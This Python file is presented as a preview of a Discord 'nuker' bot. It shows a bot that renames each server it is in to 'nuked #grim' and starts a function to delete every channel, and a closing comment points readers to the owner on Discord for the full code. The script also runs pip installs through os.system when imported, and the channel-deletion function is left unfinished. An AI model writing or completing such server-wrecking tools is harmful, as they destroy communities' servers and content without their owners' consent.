import os
os.system('pip install discord')
os.system('pip install colorama')
import discord # type: ignore
from discord.ext import commands # type: ignore
from dotenv import load_dotenv # type: ignore
from colorama import Fore, Style, init # type: ignore

init(autoreset=True)
TOKEN = os.getenv("DISCORD_TOKEN")
load_dotenv()

intents = discord.Intents.default()
intents.members = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix=["$", ",", ".", ";"], intents=intents)

print(Fore.LIGHTCYAN_EX + """
                                               
                _/                _/           
     _/_/_/  _/_/_/_/    _/_/        _/_/_/    
  _/_/        _/      _/_/_/_/  _/  _/    _/   
     _/_/    _/      _/        _/  _/    _/    
_/_/_/        _/_/    _/_/_/  _/  _/    _/     
                                               
""" + Style.RESET_ALL)

print(Fore.YELLOW + "            - est. 2023" + Style.RESET_ALL)

role_cache = {}

@bot.event
async def on_ready():
    print(Fore.GREEN + f"Logged in as {bot.user}" + Style.RESET_ALL)
    await bot.change_presence(activity=discord.Game(name="/help for assistance and instructions."))
    for guild in bot.guilds:
        role = discord.utils.get(guild.roles, name="@everyone")
        if role:
            role_cache[guild.id] = role
            print(Fore.CYAN + f"CACHED @everyone role in {guild.name}" + Style.RESET_ALL)


# --- Utilities ---
async def change_sv_name(guild):
    try:
        await guild.edit(name= "nuked #grim", reason="preview")
        print("server name changed successfully")
    except Exception as e:
        print(f"could not change server name: {e}")

async def delete_all_channels(guild):
    tasks = [channel.delete() for channel in guild.channels]

# This is just the preview. To view the whole code, contact the owner of this repository.
# - kino.dyers.eve [Discord]
